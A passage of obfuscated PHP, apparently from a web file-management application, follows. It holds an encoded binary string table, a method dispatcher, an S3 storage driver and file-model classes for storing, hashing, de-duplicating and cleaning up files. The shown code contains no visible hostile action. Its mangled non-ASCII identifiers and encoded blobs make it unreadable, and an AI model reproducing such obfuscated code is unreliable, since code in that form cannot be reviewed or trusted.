x70\xa4\x32\xc0\x72\x11\xb7\x54\x87\x80\xc1\x89\x80\xf7\x74\x6\xd0\x90\x23\x57\x86\x5a\x2a\x66\x7d\x4c\x19\xc4\x87\x4a\x9c\x65\x70\xf1\x80".base64_decode('XI5VnbUyY0URjGbVUfYWs3FpgcZ6JCdQnZVP7QxYcrBjXNpLDZsWJ4t4uV6ezfLgN9mppak8fw==')."\xd\xa2\x62\xb3\xa8\xc4\xf4\x35\xb9\x74\xe3\x9c\x79\x27\xa8\xf2\x11\x89\x3\xf2\x12\x7a\xe\xff\x81\xbb\x74\xe0\x7b\x24\x56\x69\x1e\xa0\xfa\x34\x7c\x94\x42\xa5\x19\x2c\xd1\x6b\x2c\x4\x2f\xbe\x28\x3b\x4f\xd9\x5e\xf1\xbf"."\132\143\312\301\204\147\125\375\10\262\264\242\235\245\347\343\34\275\27\160\213\206\367\14\130\345\250\203\233\55\203\142\325\147\247\225\315\317\127\261\21\162\376\202\141\43\214\107\100\24\326\165\336\112\15".base64_decode('MzdzrAVuKuhzzDEfB5hPvQDnZxypVkYHIxBXMTJk1F2qmlUZLgWRPAuwTkoaxKGKG5dX68w1kg==')."\x94\xe6\x26\x2c\xb4\xed\x62\xc4\x41\xd1\x41\x64\xf6\xd7\xa2\x2a\x6a\xc4\xa9\xd8\x95\xe2\x94\x56\x3\x64\x59\x6b\x1c\xb7\x6d\xaa\xbf\xe5\x28\xe4\xd1\x5b\x3\x9f\x81\x2a\x8\x22\xfb\xe6\x25\x63\x6d\xe2\x88\x4c\x5\xe1\x32"."\344\35\44\310\254\144\262\162\254\255\176\16\246\260\144\142\342\150\76\73\136\155\350\125\206\360\11\170\215\247\321\340\62\331\165\105\177\311\73\101\145\275\340\354\256\300\31\146\336\250\236\263\375\206\353".base64_decode('FzxTlMEXWEB58C+rkmSUksUBnzZVpgqvEXzdSKRU0uRI0BnNFJISJOjyYoo5BJF+DRnp8ZAh5Q==')."\x95\x1a\xd5\xa1\x6\xab\x48\xc5\xd5\xca\xaa\xf9\x76\xcc\x84\xf1\x52\x8a\xc6\xc4\x6e\x30\x8\x20\x4e\x4c\x73\x85\x39\x64\x9\x2d\x17\x4e\x5a\xc\x45\x7b\x53\x2f\x5f\xee\x14\x1d\x64\xa7\x5d\x5b\xfd\x96\x68\x42\xb7\x41\x61"."\254\111\72\340\71\214\223\260\234\165\205\342\246\313\42\21\112\154\215\211\16\160\116\176\26\360\360\252\107\40\317\361\117\274\321\356\71\16\72\22\56\260\174\322\76\317\113\161\151\311\240\0\141\3\302"."\317\14\33\171\153\12\357\41\331\14\371\325\135\312\311\200\42\377\146\147\113\221\350\161\234\104\135\27\227\55\140\164\307\104\315\372\325\333\114\376\146\12\377\306\103\217\350\62\243\275\325\326\243\64\356"."\366\111\203\156\37\356\313\276\3\247\115\143\356\63\150\31\41\6\251\262\107\60\40\174\2\347\65\117\74\102\52\314\42\31\225\305\300\162\70\217\100\267\351\305\266\40\336\134\134\136\66\40\57\347\60"."\15\220\213\314\102\140\104\222\21\26\26\306\1\350\307\32\335\133\33\170\265\110\330\366\362\333\351\212\23\234\364\76\143\333\331\244\121\244\26\363\303\56\152\124\125\13\224\373\354\210\33\203\246\332\347"."\76\46\316\46\221\314\244\172\100\322\20\32\127\255\230\244\120\154\13\52\50\64\220\325\105\142\224\132\204\226\47\144\366\127\131\12\74\12\117\31\212\105\70\154\331\145\103\147\172\321\336\147\222\24\216".base64_decode('rSKb7C9h7IRqNn6lKBvB/NQB3FUHQdECnrzrYIMYWIYEj/kvA7qn0jpPVAWFTHhm0xOpTpQkag==').strrev('pÎÔJ¶S1~³ªËø4E—÷¯à¬tC¼9­B-D¤–T¿jT›\\õ°¨äÏ,ã”[¸oA(DÏ¯')."\143\53\52\277\212\121\211\21\112\10\331\35\33\273\220\367\127\226\121\74\0\250\227\366\25\153\262\72\211\20\235\222\122\122\372\245\302\3\111\115\117\321\146\274\62\344\52\345\152\231\335\240\67\223\20"."\xaa\x29\xea\xf0\x29\x45\x32\x5d\xce\x8a\xf1\xe8\x99\x1\x75\x5c\xea\xa5\xb4\xf7\xbe\x8b\xaa\x5e\xca\xab\xde\x44\x34\x16\xd6\x57\x45\xa8\x6f\xab\xc8\xda\x70\x2f\xbe\x2f\x61\xd9\xec\x51\x37\xac\xb2\xb7\x4b\xed\x27\xbd\x29"."\x69\xb7\x5\x66\xd1\x35\x29\x1f\x46\x70\x73\x85\x56\x71\x19\xed\x35\x6e\x57\xc\xb\xd0\x3\xa8\x2a\xac\xf5\x66\xa6\xe6\x4f\xde\xe5\xb8\xa4\x5a\xb6\x94\x5d\x74\x94\x6c\x54\xd4\x81\xfb\xf8\x20\xaa\x8f\xf4\xe6\xc9\xa\x36"."\123\256\231\326\350\346\357\71\317\364\315\255\237\63\120\255\142\312\167\333\244\146\222\56\162\316\375\224\234\160\260\212\317\361\103\137\43\121\356\352\56\26\216\363\10\121\250\152\105\66\167\327\127\55\215"."\140\151\334\365\240\223\174\56\260\374\231\100\357\263\200\115\212\14\231\77\243\350\171\71\264\142\212\272\355\126\311\265\224\245\121\42\61\165\52\75\353\313\213\167\352\255\213\372\12\245\366\73\101\206\162"."\40\362\137\243\347\164\124\375\242\222\25\51\24\143\64\267\362\250\14\55\270\305\361\150\61\226\353\256\160\256\353\265\326\123\312\263\303\24\227\176\171\204\140\240\102\241\106\51\67\114\344\114\232\366\76".strrev('1H`Ñ_yÏ^©J‰Ê†_™,_Hˆg:—äúB•™%N¬–»±\\ûa^â—(5n¾4YË')."\262\21\256\274\272\226\67\352\12\313\212\305\250\300\100\262\15\145\361\12\325\225\373\242\61\42\131\156\171\36\113\247\333\215\221\52\131\323\25\47\106\22\43\262\62\226\135\361\244\45\255\255\314\121\265".base64_decode('dcgnrZs8GStjpactpXzZSZsNk8ZVGz4je97iqicvgVQyij+cKdR9FDEGVY+SekB8KEKMJpv0+g==')."\xd\x13\xd9\xc4\x9c\x91\x3c\xcc\x34\xd3\xef\x89\x2d\x3b\x88\x53\x89\x25\x72\x99\x65\x49\x20\xc3\x53\xaa\xaf\x2a\xea\x53\x50\xc0\xcc\x76\x2a\xd5\xa9\x5a\xd\x53\x16\x88\x57\x6f\x44\x62\xa5\x17\xc4\x8a\x58\x4b\x26\x20\x5b".strrev('<O„Ç2<8\\´Ã±ğæ¨VG2·m•®Ì‘O]Ş–lí+‰Š¡àğ5Sºz&¦3`bdl¯€{c')."\x2d\xe4\x4d\xe2\xf9\xcd\x32\xb8\xa9\x5\xca\x61\xca\x4b\x78\x5e\xa4\x56\xe3\x47\x2d\x37\x95\x51\x4e\xfe\x95\x89\x95\xf1\xc5\x8a\x69\x86\xe\x54\x1f\x47\x79\x6f\x71\x96\xcb\xd5\x9d\x64\x25\x15\xfd\x51\x74\xb1\x12\x76\x95".base64_decode('MrxHVYvxJFpSHro8ZacAAS3Lk2jZimQsXAFXVs41Ss4Uw6sEHgg101UGLIWFStap4Fk1c2VzsA==').strrev('¦JÍÊ¬…IœjS§{*”ÀÇeR  ]T¥«±ˆ>KsÊ/e<ÍT^µL®¯E²(^õYÑ3sÊ')."\x55\xd1\x9\x3\x7f\x61\x65\x8e\xc8\xaa\x24\xab\xa\x66\xd5\x55\xd0\x62\x55\xe9\x9b\xe3\x55\x13\x2b\x8b\xf7\x3c\x63\xc0\x49\x12\x32\xc6\x1b\x54\xb\x65\xa1\x25\x29\x6b\x22\xc\x63\xd6\x1a\x96\xea\xb8\x68\x47\x34\xd3\xb3"."\275\225\362\303\171\133\154\231\151\251\202\55\72\122\121\201\167\35\344\113\312\53\76\125\55\231\174\124\50\126\51\160\312\342\363\24\252\15\30\77\336\333\256\225\122\164\124\245\35\213\30\231\45\317\273"."\x59\x29\xb1\x2e\xbf\x57\x90\x22\x3a\x8f\x7a\x53\x35\x21\x3c\x8d\xe2\x9f\x1\x79\xf7\xc6\xeb\x53\x78\x34\x89\x20\x1e\x4b\x43\xce\x19\xc1\xad\x24\x57\x6c\x68\xa5\x5a\x35\xe2\x42\x9b\xdd\x2a\x70\x4e\x82\x27\xc7\xed\xa2\xeb"."\xe3\x4a\xf7\x5\xf6\xdb\x62\xbb\xae\xd4\x7\xc2\x3b\xe\x72\xe\xa0\xec\x80\x4f\x51\x7b\x23\x5f\xf2\x26\x9b\x76\x8a\x5d\x88\x32\x1c\xe6\xb7\x14\xf4\x13\x54\x2c\xa8\x54\x29\x6e\xf2\x54\x46\xf4\x3c\x1\x7a\xf5\x2a\x2\xb1".base64_decode('ypvXdvGOyrCdTtpj6B6aYI4CE8UjJniRVBTzmDscJ8hTgvCepJ/dj/jBYfH6wpCnOH+0WyjTfw==')."\122\15\160\67\40\253\340\217\311\61\131\60\130\67\306\23\361\212\244\236\120\74\276\52\32\153\343\157\317\125\44\263\122\212\306\143\105\122\117\107\264\173\252\264\160\127\50\322\131\221\106\225\43\273\165"."\xe9\x63\x9c\x27\x45\x7a\x58\x2f\x99\xce\xc0\x54\xbd\x88\xb4\xae\x90\x3d\xc1\xdb\xca\x4e\x78\x73\x5c\x4e\x82\x72\x57\x57\xc8\xd8\xf9\xa9\xe6\x11\x2b\x88\x1b\xe8\xc5\x51\xbd\xb6\x32\x73\xd2\x31\xbd\xac\xc4\x2b\x61\x53\xaf"."\266\34\174\366\106\174\170\37\214\56\323\104\366\152\340\40\346\102\265\124\11\262\33\132\212\25\40\226\76\340\47\10\200\70\117\110\135\234\200\107\15\110\211\147\213\204\121\35\145\355\252\273\73\273\356"."\x15\x82\x37\x96\x3c\xab\x2a\x34\xab\xdc\x39\xaa\x17\xb7\x34\x55\x2\x87\x76\xf3\x44\x7c\x81\x67\xbd\x9d\x94\x47\x38\x38\xdb\x81\x37\x3\x0\xb7\xa2\xf6\xca\xbf\x3d\xc9\xae\x31\xe4\x17\xe4\x40\x51\x70\xe1\xf2\x71\x4a\x14".strrev(''."\0".''."\0".'Å¡T¨šUÿúä¤'), 10, -8))); goto F¼ôÍÆİİå; bë‰¹›ŠÈÙ: function binCheckBigger($¸¹ˆÓ²ò, $ıÙ´–î·) { return $¸¹ˆÓ²ò > $ıÙ´–î·; } $_SERVER[$_SERVER[·ïÈëŒò][3]] = ("\x39\x30\x38\x32"."\61\63")+0;$_m6xn="hng8tsb54201z76fd9ecarv3qylixkmupowj56ach02pmkrlsfjdqo84b3uin1wgvxt7ey9zq597rs";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($½øî¬íò, $à°ßáïĞ) { $­£ ”ÄÂ =& $_SERVER[‘ÆÜ‘œ]; if (isset(self::$_methodList[$½øî¬íò])) { return @call_user_func_array(self::$_methodList[$½øî¬íò], $à°ßáïĞ); } else { if (method_exists($this, $½øî¬íò)) { return call_user_func_array(array($this, $½øî¬íò), $à°ßáïĞ); } else { think_exception(__CLASS__ . $­£ ”ÄÂ[4] . $½øî¬íò . $­£ ”ÄÂ[5]); } } } public static function __callStatic($íàÃùÇò, $‹ï–Ï) { if (isset(self::$_methodListStatic[$íàÃùÇò])) { return call_user_func_array(self::$_methodListStatic[$íàÃùÇò], $‹ï–Ï); } else { if (method_exists(self, $íàÃùÇò)) { return call_user_func_array(array(self, $íàÃùÇò), $‹ï–Ï); } else { show_json("{$íàÃùÇò}\50\51\x20\156\x6f\164\x20\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($‘„‹Á¥®, $ÎÖ¸š×) { self::$_methodList[$‘„‹Á¥®] = $ÎÖ¸š×; } public static function addMethodStatic($Ş«ìÓÙ, $ïº®Å) { self::$_methodListStatic[$Ş«ìÓÙ] = $ïº®Å; } } goto FÍÓ¶‘Ø™¤; E¶É…êŒÜò: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ª£éäÖ) { $Ñ½ ¹á‹ =& $_SERVER[‘ÆÜ‘œ]; parent::__construct($ª£éäÖ); $ùÑ£»õŒ = isset($ª£éäÖ[$Ñ½ ¹á‹[257]]) && $ª£éäÖ[$Ñ½ ¹á‹[257]] == $Ñ½ ¹á‹[248] ? $Ñ½ ¹á‹[248] : $Ñ½ ¹á‹[314]; $this->setSignVersion($ùÑ£»õŒ); } public function link($ÑÈ€é™Ê, $ÆÍ€€·Ù = array()) { return parent::link($ÑÈ€é™Ê, $ÆÍ€€·Ù); } public function fileOut($²ÎòÆë”, $°ÅæÉã» = false, $‹¯Óùå¹ = false, $ë¶Å°ıá = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[‘ÆÜ‘œ][315])) { return parent::fileOutServer($²ÎòÆë”, $°ÅæÉã», $‹¯Óùå¹, $ë¶Å°ıá); } parent::fileOut($²ÎòÆë”, $°ÅæÉã», $‹¯Óùå¹, $ë¶Å°ıá); } public function fileOutImage($ÑÕãëªù, $ùĞ¼«ú™ = 250) { if (strstr($this->endpoint, $_SERVER[‘ÆÜ‘œ][315])) { return parent::fileOutImageServer($ÑÕãëªù, $ùĞ¼«ú™); } parent::fileOutImage($ÑÕãëªù, $ùĞ¼«ú™); } } define($_SERVER[‘ÆÜ‘œ][316], 1); define($_SERVER[‘ÆÜ‘œ][317], 2); goto cßö™¤ôÍ¶; CÇ£ÒÎÇµç: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\x6c\145\137\x63\x6f\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\164", "\x66\165\156\x63\x74\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\x65"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\145" => "\x69\x6f\x5f\x66\x69\x6c\x65\137\x6d\x65\x74\x61", "\155\145\x74\141\x46\151\x65\x6c\144" => "\x66\151\x6c\x65\111\x44"); public function fileInfo($ıã•é) { $¸ûÛÛ¡¹ =& $_SERVER[‘ÆÜ‘œ]; static $ò¦¼Â•ä = array(); if (!isset($ò¦¼Â•ä[$ıã•é])) { $šş‹¿¿ = $¸ûÛÛ¡¹[2185]; $ç†¼Ûî€ = Model($¸ûÛÛ¡¹[568])->field($šş‹¿¿)->where(array($¸ûÛÛ¡¹[566] => $ıã•é))->find(); $ò¦¼Â•ä[$ıã•é] = $ç†¼Ûî€; } return $ò¦¼Â•ä[$ıã•é]; } public function addFileByContent($Í‹Ş€‘÷ = '', $§´ŞÂšû, $½Œæ¾‰à = '') { $úÔ†Â°Ø =& $_SERVER[‘ÆÜ‘œ]; $Ş€ÁÖ¡ä = TEMP_PATH . $úÔ†Â°Ø[2186]; if (!is_dir($Ş€ÁÖ¡ä)) { mk_dir($Ş€ÁÖ¡ä); } $ŞÊçÁÌÇ = $Ş€ÁÖ¡ä . $úÔ†Â°Ø[2187] . rand_string(16); $òéÊ“Äº = file_put_contents($ŞÊçÁÌÇ, $Í‹Ş€‘÷); if ($òéÊ“Äº === !1 || strlen($Í‹Ş€‘÷) != $òéÊ“Äº) { return !1; } $Œãì•µî = $this->addFile($ŞÊçÁÌÇ, $§´ŞÂšû, $½Œæ¾‰à, !0); if (file_exists($ŞÊçÁÌÇ)) { @unlink($ŞÊçÁÌÇ); } return $Œãì•µî; } public function createFileName($Ú±÷şÛ®, $¹œ¾÷Ññ, $…©ğêÆ = false, $ Õõª¼· = false) { $Ø“ä–Ç” =& $_SERVER[‘ÆÜ‘œ]; $ŞÕ£Ù˜í = IO::init($Ø“ä–Ç”[8]); $ûŒ¥Š¾† = $this->_makeFilePath($Ú±÷şÛ®, $¹œ¾÷Ññ, $ŞÕ£Ù˜í, $…©ğêÆ, $ Õõª¼·); $’ÕØ¾× = $ŞÕ£Ù˜í->pathFather($ûŒ¥Š¾†); static $¬—ˆ˜À• = false; $õŸ¯ÜıÌ = $Ø“ä–Ç”[2188] . md5($’ÕØ¾×); if (!$¬—ˆ˜À• && !Cache::get($õŸ¯ÜıÌ)) { $¬—ˆ˜À• = !0; $ñÂ©é®º = IO::mkdir($’ÕØ¾×); if (!IO::exist($ñÂ©é®º . $Ø“ä–Ç”[908])) { IO::mkfile($ñÂ©é®º . $Ø“ä–Ç”[908]); } Cache::set($õŸ¯ÜıÌ, 1, 3600 * 2); } return $ûŒ¥Š¾†; } public function _makeFilePath($ó”Ùò§Ø, $ã…“İŸ, $šçÓ°°, $ö‚Æ÷ú» = false, $Ş¼šŞ§Ï = false) { $Ûã‘Íî =& $_SERVER[‘ÆÜ‘œ]; $ö¼ÛìÌÄ = Model($Ûã‘Íî[880])->get($Ûã‘Íî[2189]); $¹²­Ğ«ä = $Ûã‘Íî[1376] . $ã…“İŸ[$Ûã‘Íî[495]] . $Ûã‘Íî[507] . date($Ûã‘Íî[2190]); $„¡Ô‹ãñ = $¹²­Ğ«ä . rand_string(5) . short_id(100); $ó”Ùò§Ø = str_replace($Ûã‘Íî[8], $Ûã‘Íî[11], KodIO::clear($ó”Ùò§Ø)); $óœ°– = $šçÓ°°->ext($ó”Ùò§Ø); if (!$ó”Ùò§Ø) { $ö¼ÛìÌÄ = $Ûã‘Íî[886]; } switch ($ö¼ÛìÌÄ) { case $Ûã‘Íî[2191]: if ($óœ°–) { $„¡Ô‹ãñ = $„¡Ô‹ãñ . $Ûã‘Íî[10] . $óœ°–; } if ($óœ°– == $Ûã‘Íî[2129]) { $„¡Ô‹ãñ .= $Ûã‘Íî[1345]; } break; case $Ûã‘Íî[2192]: $›«¾ú¥£ = Model($Ûã‘Íî[880])->get($Ûã‘Íî[881]); $£¥Ûã = substr(md5($Ûã‘Íî[882] . $›«¾ú¥£ . date($Ûã‘Íî[856])), 0, 8); $¹²­Ğ«ä = $Ûã‘Íî[1376] . $ã…“İŸ[$Ûã‘Íî[495]] . $Ûã‘Íî[507] . date($Ûã‘Íî[2193]) . $£¥Ûã . $Ûã‘Íî[8]; if ($óœ°– == $Ûã‘Íî[2129]) { $ó”Ùò§Ø .= $Ûã‘Íî[1345]; } $òæšÀÊ„ = $Ûã‘Íî[2194] . $¹²­Ğ«ä . $ó”Ùò§Ø; CacheLock::lock($òæšÀÊ„); $„¡Ô‹ãñ = $¹²­Ğ«ä . $ó”Ùò§Ø; if (IO::exist($¹²­Ğ«ä . $ó”Ùò§Ø)) { $‘ÜÈÅ´£ = substr($ó”Ùò§Ø, 0, strlen($ó”Ùò§Ø) - strlen($óœ°–)); $¨‘ùğÃì = $Ş¼šŞ§Ï ? substr($Ş¼šŞ§Ï, 0, 5) : ($ö‚Æ÷ú» ? substr($ö‚Æ÷ú», 0, 5) : rand_string(5)); $¨‘ùğÃì .= rand_string(3); $„¡Ô‹ãñ = $¹²­Ğ«ä . $‘ÜÈÅ´£ . $¨‘ùğÃì; if ($óœ°–) { $„¡Ô‹ãñ = $„¡Ô‹ãñ . $Ûã‘Íî[10] . $óœ°–; } } if (IO::isOsDriver($„¡Ô‹ãñ) && !IO::isUploadServer($„¡Ô‹ãñ)) { if (IO::exist($„¡Ô‹ãñ)) { CacheLock::unlock($òæšÀÊ„); return $„¡Ô‹ãñ; } $ñ¢îã³Ç = IO::setContent($„¡Ô‹ãñ, $Ûã‘Íî[12]); if (!$ñ¢îã³Ç) { show_json($Ûã‘Íî[2195], !1); } } CacheLock::unlock($òæšÀÊ„); break; case $Ûã‘Íî[886]: break; default: break; } return $„¡Ô‹ãñ; } public function addFileByRemote($€³â‹Šô, $Ç··ºÉ, $æ±ÒÁ· = array()) { $€¤ïİ† =& $_SERVER[‘ÆÜ‘œ]; if (!IO::isFile($€³â‹Šô)) { return !1; } $Ìº…°ê = $æ±ÒÁ·[$€¤ïİ†[571]] ? $æ±ÒÁ·[$€¤ïİ†[571]] : $€¤ïİ†[12]; $Â•«”†® = IO::hashMd5($€³â‹Šô, $Ìº…°ê); $ØÑ·Ì—˜ = KodIO::parse($€³â‹Šô); $şÄšŠüü = array($€¤ïİ†[648] => IO::size($€³â‹Šô), $€¤ïİ†[2196] => 1, $€¤ïİ†[517] => $Ç··ºÉ, $€¤ïİ†[922] => $ØÑ·Ì—˜[$€¤ïİ†[495]], $€¤ïİ†[518] => $€³â‹Šô, $€¤ïİ†[2197] => $æ±ÒÁ·[$€¤ïİ†[702]] ? $æ±ÒÁ·[$€¤ïİ†[702]] : IO::hashSimple($€³â‹Šô), $€¤ïİ†[2198] => $Â•«”†® ? $Â•«”†® : $Ìº…°ê); if ($Ùµ¼¨ = $this->addFileCheckExist($şÄšŠüü[$€¤ïİ†[702]], $şÄšŠüü[$€¤ïİ†[571]], $şÄšŠüü[$€¤ïİ†[79]])) { return $Ùµ¼¨; } return $this->addFileData($şÄšŠüü); } private function addFileData($Õø¿åõÈ) { $‰ë©òùº =& $_SERVER[‘ÆÜ‘œ]; if (!$Õø¿åõÈ) { return !1; } if (!IO::isFile($Õø¿åõÈ[$‰ë©òùº[87]])) { return !1; } $Õø¿åõÈ[$‰ë©òùº[79]] = intval($Õø¿åõÈ[$‰ë©òùº[79]]); if (!$Õø¿åõÈ[$‰ë©òùº[79]] && strlen($Õø¿åõÈ[$‰ë©òùº[702]]) > 32) { $Õø¿åõÈ[$‰ë©òùº[79]] = intval(substr($Õø¿åõÈ[$‰ë©òùº[702]], 32)); } $ğ‚ìğ¨Ë = $this->add($Õø¿åõÈ); return $this->find($ğ‚ìğ¨Ë); } public function addFile($î«âôû–, $€ğóì…, $ÍïÖµ÷ , $Úä• º = false) { $éèñ‡ÜÛ =& $_SERVER[‘ÆÜ‘œ]; $‹åç½í = IO::hashSimple($î«âôû–); $¯ó¡ì²Õ = IO::size($î«âôû–); $½¦—«£ = $¯ó¡ì²Õ <= 1024 * 1024 * 10 ? IO::hashMd5($î«âôû–) : $éèñ‡ÜÛ[12]; $ï—é±”¾ = $éèñ‡ÜÛ[2199] . $‹åç½í; CacheLock::lock($ï—é±”¾); if ($½¦—«£ && $‹åç½í) { $ÄÛÎ©”ì = $this->addFileCheckExist($‹åç½í, $½¦—«£, $¯ó¡ì²Õ); if ($ÄÛÎ©”ì) { CacheLock::unlock($ï—é±”¾); return $ÄÛÎ©”ì; } } $‹£³—½ = $this->addFileMake($î«âôû–, $€ğóì…, $¯ó¡ì²Õ, $‹åç½í, $½¦—«£, $ÍïÖµ÷ , $Úä• º); $Õ×š¹× = $this->addFileData($‹£³—½); if (!$Õ×š¹×) { return !1; } CacheLock::unlock($ï—é±”¾); if (!$½¦—«£ && $Õ×š¹×) { $this->fileMd5Check($Õ×š¹×); } return $Õ×š¹×; } public function fileMd5Check($Ì±Åº¼‘) { $ÎÂ²ÅÇÆ =& $_SERVER[‘ÆÜ‘œ]; $¥ŒÃå±ã = array($Ì±Åº¼‘[$ÎÂ²ÅÇÆ[565]], $Ì±Åº¼‘[$ÎÂ²ÅÇÆ[87]]); $Î±Ëƒ›Ü = $ÎÂ²ÅÇÆ[2200] . $Ì±Åº¼‘[$ÎÂ²ÅÇÆ[87]]; $‰‰ƒ¦•à = $ÎÂ²ÅÇÆ[2201] . $Ì±Åº¼‘[$ÎÂ²ÅÇÆ[565]]; TaskQueue::add($ÎÂ²ÅÇÆ[2202], $¥ŒÃå±ã, $Î±Ëƒ›Ü, $‰‰ƒ¦•à); } public function fileMd5Set($¬§ê“ó, $ğÏ³Öòõ) { $Ğ¹‰›ü€ =& $_SERVER[‘ÆÜ‘œ]; $Üí´°Ø = $this->find($¬§ê“ó); if (!$Üí´°Ø || $Üí´°Ø[$Ğ¹‰›ü€[571]]) { return; } $Ñ»ï€ıº = IO::hashMd5($ğÏ³Öòõ); if (!$Ñ»ï€ıº) { return $Ğ¹‰›ü€[12]; } $this->where(array($Ğ¹‰›ü€[565] => $¬§ê“ó))->save(array($Ğ¹‰›ü€[571] => $Ñ»ï€ıº)); } public function addFileMake($ò  ù˜², $ÎÇ¬¨ƒÔ, $«¤ˆ°ÙÖ, $ÜÒíØÊÂ, $•™—êÈÊ, $¿¹ûàÓ¾, $â–ŞÌå¤) { $ÃñŒÖ¦¬ =& $_SERVER[‘ÆÜ‘œ]; $«áÃ¸•Š = $this->createFileName($¿¹ûàÓ¾, $ÎÇ¬¨ƒÔ, $ÜÒíØÊÂ, $•™—êÈÊ); $•‘á¶ŒÊ = get_path_father($«áÃ¸•Š); $Â¡ª” = get_path_this($«áÃ¸•Š); if ($â–ŞÌå¤) { $Ñ”È±Ä’ = IO::move($ò  ù˜², $•‘á¶ŒÊ, !1, $Â¡ª”); } else { $Ñ”È±Ä’ = IO::copy($ò  ù˜², $•‘á¶ŒÊ, !1, $Â¡ª”); } if (!$Ñ”È±Ä’) { return !1; } $Óú“÷Ëú = IO::init($Ñ”È±Ä’); $Óú“÷Ëú->cacheMethod($ÃñŒÖ¦¬[180], $Óú“÷Ëú->path, $ÃñŒÖ¦¬[177]); if (IO::size($Ñ”È±Ä’) != $«¤ˆ°ÙÖ) { return !1; } $ş³ÓÃ¶Ê = array($ÃñŒÖ¦¬[648] => $«¤ˆ°ÙÖ, $ÃñŒÖ¦¬[2196] => 1, $ÃñŒÖ¦¬[517] => $¿¹ûàÓ¾, $ÃñŒÖ¦¬[922] => $ÎÇ¬¨ƒÔ[$ÃñŒÖ¦¬[495]], $ÃñŒÖ¦¬[518] => $«áÃ¸•Š, $ÃñŒÖ¦¬[2197] => $ÜÒíØÊÂ, $ÃñŒÖ¦¬[2198] => $•™—êÈÊ); return $ş³ÓÃ¶Ê; } public function addFileCheckExist($‡¢—Äùë, $ŞÚª¨‰ß, $¼şÛ±¼ç) { $¿ş’Ùá— =& $_SERVER[‘ÆÜ‘œ]; $óÑÔ‚õÃ = $this->findByHash($‡¢—Äùë, $ŞÚª¨‰ß); if (!$óÑÔ‚õÃ) { return !1; } $ßˆÉ¦ Ù = array($¿ş’Ùá—[2196] => intval($óÑÔ‚õÃ[$¿ş’Ùá—[2203]]) + 1, $¿ş’Ùá—[648] => $¼şÛ±¼ç); $this->where(array($¿ş’Ùá—[566] => $óÑÔ‚õÃ[$¿ş’Ùá—[565]]))->save($ßˆÉ¦ Ù); return $óÑÔ‚õÃ; } public function remove($óÒËĞº›) { $this->linkCountChange($óÒËĞº›, !1); $this->clearEmpty(); return !0; } public function linkAdd($¾ê†Š’©) { $this->linkCountChange($¾ê†Š’©, !0); } public function linkCountChange($„Œ§ÕŞ©, $œ²Ç…ù¡) { $ÙÀÔõä˜ =& $_SERVER[‘ÆÜ‘œ]; if (!$„Œ§ÕŞ©) { return; } if (!is_array($„Œ§ÕŞ©)) { $„Œ§ÕŞ© = array($„Œ§ÕŞ©); } $‚Â´Èß = array(); foreach ($„Œ§ÕŞ© as $ö¨—ÜèÃ) { $¿ú£ÇŞÅ = $ö¨—ÜèÃ . $ÙÀÔõä˜[12]; if (!$‚Â´Èß[$¿ú£ÇŞÅ]) { $‚Â´Èß[$¿ú£ÇŞÅ] = 0; } $‚Â´Èß[$¿ú£ÇŞÅ]++; } $„¸°Æûì = array(); foreach ($‚Â´Èß as $ö¨—ÜèÃ => $ğöüÒı) { $¿ú£ÇŞÅ = $ğöüÒı . $ÙÀÔõä˜[12]; if (!$„¸°Æûì[$¿ú£ÇŞÅ]) { $„¸°Æûì[$¿ú£ÇŞÅ] = array(); } $„¸°Æûì[$¿ú£ÇŞÅ][] = $ö¨—ÜèÃ; } foreach ($„¸°Æûì as $ğöüÒı => $àìı„Òñ) { if (!$àìı„Òñ) { continue; } $ğöüÒı = $œ²Ç…ù¡ ? $ğöüÒı : -intval($ğöüÒı); $é¢¹çøˆ = array($ÙÀÔõä˜[565] => array($ÙÀÔõä˜[7], $àìı„Òñ)); if ($ğöüÒı < 0) { $é¢¹çøˆ[$ÙÀÔõä˜[2203]] = array($ÙÀÔõä˜[1133], abs($ğöüÒı)); } $this->where($é¢¹çøˆ)->setAdd($ÙÀÔõä˜[2203], $ğöüÒı); } } public function findByHash($‰¥°¿–Ÿ, $‚¬çš± = false) { $ ¦Ó˜„ğ =& $_SERVER[‘ÆÜ‘œ]; if (!$‰¥°¿–Ÿ && !$‚¬çš±) { return !1; } $ñ„ ôü­ = array($ ¦Ó˜„ğ[2197] => $‰¥°¿–Ÿ); if ($‚¬çš±) { $ñ„ ôü­ = array($ ¦Ó˜„ğ[2198] => $‚¬çš±); } return $this->order($ ¦Ó˜„ğ[2204])->where($ñ„ ôü­)->find(); } public function clearEmpty($€¸»Ò¥ = 1) { $òÛÎ’€µ =& $_SERVER[‘ÆÜ‘œ]; $¤İÍ™§± = time() - 3600 * 24 * $€¸»Ò¥; $‰Ÿê¤ = $òÛÎ’€µ[2205] . $¤İÍ™§±; $´Â²—Ñ = $this->where($‰Ÿê¤)->select(); if (!$´Â²—Ñ) { return; } $–Şş½Ì = new Task($òÛÎ’€µ[2206], $òÛÎ’€µ[12], count($´Â²—Ñ)); foreach ($´Â²—Ñ as $…üÛ‹òİ) { $–Şş½Ì->update(1); $this->resetFile($…üÛ‹òİ); } $–Şş½Ì->end(); } public function resetFile($Úİñ×Ïê) { $‡×¥ƒÔ× =& $_SERVER[‘ÆÜ‘œ]; $Œ«×ıí¾ = array($‡×¥ƒÔ×[566] => $Úİñ×Ïê[$‡×¥ƒÔ×[565]]); $°ˆ‰‹· = Model($‡×¥ƒÔ×[1484])->where($Œ«×ıí¾)->count(); $¦•˜ä­ = Model($‡×¥ƒÔ×[2207])->where($Œ«×ıí¾)->count(); $ªåáú = intval($°ˆ‰‹·) + intval($¦•˜ä­); if ($ªåáú == 0) { Model($‡×¥ƒÔ×[2208])->delete($Úİñ×Ïê[$‡×¥ƒÔ×[565]]); $this->where($Œ«×ıí¾)->delete(); $this->metaSet($Úİñ×Ïê[$‡×¥ƒÔ×[565]], null, null); if (!IO::isFile($Úİñ×Ïê[$‡×¥ƒÔ×[87]])) { 